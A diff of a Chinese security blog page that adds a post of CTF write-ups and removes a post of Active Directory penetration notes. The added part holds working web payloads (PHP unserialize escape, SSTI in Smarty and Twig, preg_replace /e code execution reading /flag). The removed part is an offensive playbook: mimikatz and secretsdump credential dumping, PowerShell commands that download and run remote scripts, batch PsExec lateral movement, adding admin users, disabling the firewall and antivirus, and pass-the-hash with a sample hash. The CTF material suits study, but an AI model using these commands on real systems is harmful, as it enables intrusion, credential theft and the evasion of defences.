@@ -66,6 +66,268 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-3月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
+  <time class="dt-published" datetime="2020-04-01T09:49:54.431Z" itemprop="datePublished">2020-04-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="3月做题"><a href="#3月做题" class="headerlink" title="3月做题"></a>3月做题</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><pre><code class="php">&lt;?php
+
+$function = @$_GET[&#39;f&#39;];
+
+function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
+    return preg_replace($filter,&#39;&#39;,$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
+$_SESSION[&#39;function&#39;] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
+}
+
+if(!$_GET[&#39;img_path&#39;]){
+    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+}else{
+    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == &#39;highlight_file&#39;){
+    highlight_file(&#39;index.php&#39;);
+}else if($function == &#39;phpinfo&#39;){
+    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
+}else if($function == &#39;show_image&#39;){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
+}</code></pre>
+<pre><code class="php">function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
+    return preg_replace($filter,&#39;&#39;,$img);
+}
+extract($_POST);
+$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+$serialize_info = filter(serialize($_SESSION));
+$userinfo = unserialize($serialize_info);
+echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre>
+<p>我们利用filter来吞掉一些字符,从而让我们任意反序列化</p>
+<p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></p>
+<p>我们分析一下为什么是这个payload:</p>
+<p>…</p>
+<p>在phpinfo中找到</p>
+<table>
+<thead>
+<tr>
+<th>config</th>
+<th>Local Value</th>
+<th>Mastr Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>auto_append_file</td>
+<td>d0g3_f1ag.php</td>
+<td>d0g3_f1ag.php</td>
+</tr>
+</tbody></table>
+<pre><code>_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}
+_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></pre><pre><code class="php">
+&lt;?php
+
+$flag = &#39;flag in /d0g3_fllllllag&#39;;
+
+?&gt;</code></pre>
+<p><code>flag{62b16099-c29d-499a-9dde-e54bf2985b31}</code></p>
+<h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串</p>
+<blockquote>
+<p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。</p>
+</blockquote>
+<p>   特殊字符串:</p>
+<blockquote>
+<p>129581926211651571912466741651878684928<br>ffifdyop</p>
+</blockquote>
+<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><pre><code class="php">&lt;?php
+
+include &#39;flag.php&#39;;
+
+$yds = &quot;dog&quot;;
+$is = &quot;cat&quot;;
+$handsome = &#39;yds&#39;;
+
+foreach($_POST as $x =&gt; $y){
+    $$x = $y;
+}
+
+foreach($_GET as $x =&gt; $y){
+    $$x = $$y;
+}
+#$x=handsome $y=flag
+foreach($_GET as $x =&gt; $y){
+    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
+    exit($yds);
+}
+
+if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
+    exit($is);
+}
+
+
+
+echo &quot;the flag is: &quot;.$flag;</code></pre>
+<p><code>/index.php?yds=flag</code></p>
+<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>根据题目的提示,修改xff头,发现可以修改ip,但是修改成127.0.0.1后没有啥东西</p>
+<p>后来在fuzz的过程中发现,有ssti漏洞</p>
+<pre><code>GET /flag.php HTTP/1.1
+Host: node3.buuoj.cn:27223
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: {system(&#39;cat /flag&#39;)}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://node3.buuoj.cn:27223/
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0
+Connection: close</code></pre><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><pre><code class="php">&lt;?php
+
+error_reporting(0);
+$text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file)){
+        die(&quot;Not now!&quot;);
+    }
+
+    include($file);  //next.php
+
+}
+else{
+    highlight_file(__FILE__);
+}
+?&gt;</code></pre>
+<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</code></pre><p>next.php</p>
+<pre><code class="php">&lt;?php
+$id = $_GET[&#39;id&#39;];
+$_SESSION[&#39;id&#39;] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        &#39;/(&#39; . $re . &#39;)/ei&#39;,
+        &#39;strtolower(&quot;\\1&quot;)&#39;,
+        $str
+    );
+}
+
+
+foreach($_GET as $re =&gt; $str) {
+    echo complex($re, $str). &quot;\n&quot;;
+}
+
+function getFlag(){
+    @eval($_GET[&#39;cmd&#39;]);
+}
+</code></pre>
+<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=${getFlag()}&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</code></pre><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>根据提示发现</p>
+<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</code></pre><p>fuzz过程中猜测是ssti</p>
+<p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p>
+<p>检测出是twig</p>
+<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>在index.php.swp中找到源码</p>
+<pre><code class="php">&lt;?php
+    ob_start();
+    function get_hash(){
+        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
+        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+        $content = uniqid().$random;
+        return sha1($content); 
+    }
+    header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+    ***
+    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )
+    {
+        $admin = &#39;6d0bc1&#39;;
+        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) {
+            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;
+            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
+            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
+            $text = &#39;
+            ***
+            ***
+            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;
+            ***
+            ***&#39;;
+            fwrite($shtml,$text);
+            fclose($shtml);
+            ***
+            echo &quot;[!] Header  error ...&quot;;
+        } else {
+            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;
+
+    }else
+    {
+    ***
+    }
+    ***
+?&gt;</code></pre>
+<p>爆破得到密码,</p>
+<p>因为将用户名插入到了shtml,造成ssi rce</p>
+<p> <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/01/3月做题/">http://blog.ccreater.top/2020/04/01/3月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cka3ckr1v0008v4v079fjgauh" data-title="3月做题" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-volgactf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/03/30/volgactf/" class="article-date">
@@ -2646,149 +2908,11 @@ const infobox = (text) =&gt; {
 
 
   
-    <article id="post-域渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
-  <time class="dt-published" datetime="2020-02-17T04:33:47.825Z" itemprop="datePublished">2020-02-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="域渗透学习笔记"><a href="#域渗透学习笔记" class="headerlink" title="域渗透学习笔记"></a>域渗透学习笔记</h1><h2 id="名词-缩写"><a href="#名词-缩写" class="headerlink" title="名词/缩写"></a>名词/缩写</h2><p> 活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。<br>域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 </p>
-<h2 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h2><p> 将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。 </p>
-<h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p> 域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p>
-<p> 默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中</p>
-<h2 id="一些其他关于域的知识"><a href="#一些其他关于域的知识" class="headerlink" title="一些其他关于域的知识"></a>一些其他关于域的知识</h2><h3 id="DNS定位域控制器"><a href="#DNS定位域控制器" class="headerlink" title="DNS定位域控制器"></a>DNS定位域控制器</h3><p>DNS负责将域名解析成IP地址</p>
-<p>内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。</p>
-<p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。</p>
-<h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p> 通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从<strong>域成员主机内存中</strong>dump出域管理员密码，进而拿下域控制器、渗透整个内网。 </p>
-<h2 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre><code>dsquery server #得到域控制器的IP</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p>
-<p><code>net group &quot;domain controllers&quot; /domain</code>: 得到域控制器主机名 </p>
-<p> 注意通过该指令得到的机器名后面会多一个$符号</p>
-<p><code>net group &quot;domain admins&quot; /domain</code>  : 查询域管理用户 </p>
-<p><code>net user /domain</code>查看所有域用户</p>
-<p><code>net config workstation</code> : 查询当前登陆域 </p>
-<p><code>net accounts /domain</code>:  查询域密码策略 </p>
-<p><code>wmic qfe</code> : 查看补丁信息 </p>
-<p><code>wmic os</code>:  查看操作系统类型 </p>
-<p><code>ipconfig /all</code>查询本机IP段，所在域等</p>
-<p><code>tasklist /S ip /U domain\username /P /V</code>查看远程计算机进程列表</p>
-<p> 有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递攻击了 </p>
-<h4 id="批量查找-域管理员登陆过目标计算机"><a href="#批量查找-域管理员登陆过目标计算机" class="headerlink" title="批量查找 域管理员登陆过目标计算机"></a>批量查找 域管理员登陆过目标计算机</h4><pre><code class="bat">@echo off
-echo check ip addr config file...
-if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
-echo read and analysis file...
-for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt
-:end
-exit</code></pre>
-<h4 id="批量反弹cmdshell"><a href="#批量反弹cmdshell" class="headerlink" title="批量反弹cmdshell"></a>批量反弹cmdshell</h4><pre><code class="cmd">@echo off
-echo check ip addr config file...
-if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
-echo read and analysis file...
-for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd
-:end
-exit</code></pre>
-<h3 id="访问内网其他主机"><a href="#访问内网其他主机" class="headerlink" title="访问内网其他主机"></a>访问内网其他主机</h3><p> net use建立Ipc$连接、wmic指令连接、采用rdp方式连接 , psexec进行远程连接 </p>
-<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p>
-<p><code>net use \\ip\ipc$ pawword /user:username</code>建立IPC会话</p>
-<h3 id="抓取内存中的hash-密码"><a href="#抓取内存中的hash-密码" class="headerlink" title="抓取内存中的hash/密码"></a>抓取内存中的hash/密码</h3><p>抓明文</p>
-<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCerts</code></pre><h4 id="普通hash"><a href="#普通hash" class="headerlink" title="普通hash"></a>普通hash</h4><p>抓hash</p>
-<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></pre><p>抓取明文:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
-<p>抓取hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p>
-<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p>
-<h4 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h4><p>NTDS.dit获取域控hash</p>
-<p>这个思路在域渗透中尤为重要，因为这里面包含着所有域用户的hash，当然该思路只对DC生效。</p>
-<p>手动导出NTDS.dit和System-hive，本地或目标机导hash，因为，如果域足够大，该文件也会特别大。</p>
-<p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p>
-<p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:注意-d 为ntds.dit路径,-s为system(导出的)路径</p>
-<p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p>
-<pre><code>python secretsdump.py -system SYSTEM -ntds ntds.dit local
-python secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181
-</code></pre><p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p>
-<p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p>
-<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><pre><code>net user ccreater Abc1234 /add
-net localgroup administrators ccreater /add
-REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
-</code></pre><h3 id="域控提取域用户hash"><a href="#域控提取域用户hash" class="headerlink" title="域控提取域用户hash"></a>域控提取域用户hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exe是域控制器自带的域数据库管理工具，从windows 2008就默认自带了 </p>
-<pre><code>Ntdsutil 
-    snapshot—activate instance ntds
-    create
-    mount {guid}
-copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p>
-<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p>
-<p> 最后执行 </p>
-<pre><code>unmount {guid}
-delete {guid}
-quit</code></pre><p> 删除装载点即可，避免被发现 </p>
-<p>接着上传工具QuarksPwDump到域控制器上，然后执行如下命令，成功提取用户hash</p>
-<p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p>
-<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙
-net stop windefend
-netsh firewall set opmode mode=disable
-bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
-meterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p> 域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要我们拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。 </p>
-<h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> 微软给出的补丁是kb3011780，在server 2000以上的域控中，如果没有打这个补丁，那么情况将比较糟糕，利用该漏洞可以将任何一个域用户提权至域管理员权限，危害极大。 </p>
-<h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>目标:192.168.52.138</p>
-<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><pre><code>use exploit/windows/smb/psexec
-set lhost xxx
-set lport xxx
-set rhosts 192.168.52.138
-set smbuser Administrator
-set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><pre><code>python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138
-
-or
-
-python smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138
-</code></pre><p>显然，其实它只需要NThash部分就好啦。</p>
-<h2 id="copy-于"><a href="#copy-于" class="headerlink" title="copy 于"></a>copy 于</h2><p> <a href="http://www.xmrseo.com/?post=87" target="_blank" rel="noopener">http://www.xmrseo.com/?post=87</a> </p>
-<p> <a href="https://zhengbao.wang/域渗透基础/" target="_blank" rel="noopener">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p>
-<p> <a href="https://www.freebuf.com/articles/system/217681.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/217681.html</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/域渗透/">http://blog.ccreater.top/2020/02/17/域渗透/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="cka3ckr3n004iv4v07tfp7543" data-title="域渗透" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/4/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/">Next -&gt;</a>
+    <a class="extend prev" rel="prev" href="/page/4/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">Next -&gt;</a>
   </nav>
 
 </section>
@@ -2841,6 +2965,10 @@ python smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.16
       <ul>
         
           <li>
+            <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/12/Academy_write_up/">Academy_write_up</a>
           </li>
         
@@ -2854,10 +2982,6 @@ python smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.16
         
           <li>
             <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
           </li>
         
       </ul>
